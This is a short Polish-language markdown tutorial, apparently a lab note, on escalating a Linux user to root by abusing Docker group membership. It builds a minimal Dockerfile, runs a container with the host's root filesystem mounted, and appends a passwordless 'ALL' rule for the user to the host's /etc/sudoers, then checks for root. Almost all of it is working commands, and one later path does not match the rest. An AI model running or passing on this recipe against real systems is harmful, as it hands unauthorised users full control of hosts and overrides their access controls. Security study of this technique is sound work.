# Eskalacja uprawnień użytkownika (nielegalna!)

Testowanie uprawnień i tworzenie pliku dockerfile

```bash
more /etc/passwd | grep <nazwa_usera> # sprawdzenie informacji odnośnie konkretnego użytkownika
id # sprawdzenie id aktualnie zalogowanego użytkownika
whoami # sprawdzenie, na jakiego usera jesteśmy zalogowani
getent group | grep docker # sprawdzenie grupy docker
getent group | grep user # sprawdzenie grupy user
sudo bash # próba uruchomemia programu jako root (weryfikacja poziomu uprawnień)
mkdir /home/user/folder # utworzenie katalogu roboczego
cd /home/user/folder
nano Dockerfile # otworzenie pliku dockerfile w edytorze nano (jeżeli nie istnieje, to zostanie utworzony)
```

Struktura pliku Dockerfile:
    - FROM debian:wheezy # żródłowy obraz OSa
    - ENV WORKDIR /folder # utworzenie zmiennej środowiskowej
    - RUN mkdir -p $WORKDIR # punkt montowania systemu plików
    - VOLUME $WORKDIR # ustawiemie woluminu
    - WORKDIR $WORKDIR # ustawienie przestrzeni roboczej

Dockerfile:

```docker
    FROM debian:wheezy
    ENV WORKDIR /folder
    RUN mkdir -p $WORKDIR
    VOLUME $WORKDIR
    WORKDIR $WORKDIR
```

Tworzenie, uruchamianie obrazu, wykorzystanie luki i ponowna weryfikacja uprawnień

```bash
docker build -t folder . # tworzenie pliku obrazu folder
docker ps # wyświetlenie listy uruchomionych aplikacji kontenerowych
docker run -v /:/folder -it folder /bin/bash # uruchamianie obrazu (montowanie systemu plików do wskazanej lokalizacji kontenera oraz wybranie trybu internatywnego (opcja -i), opcji wykorzystania terminala (opcja -t), nazwy kontenera (tutaj folder) i powłoki OSa (tutaj /bin/bash) )
cd ..
echo "user ALL=(ALL) NOPASSWD:ALL" >> /folder/etc/sudoers # dodanie użytkownika do grupy sudoers (dopisanie do pliku /etc/sudoers hosta)
cat dajroot/etc/sudoers # wyświetlenie pliku /etc/sudoers
exit # zakończenie pracy z poziomu kontene
sudo bash # wetyfikacja uprawnień
id # sprawdzenie id aktualnie zalogowanego użytkownika
whoami # sprawdzenie, na jakiego usera jesteśmy zalogowani
cd ~ # przejście do katalogu domowego użytkownika
pwd # wyświetlenie ścieżki do aktualnego folderu
```
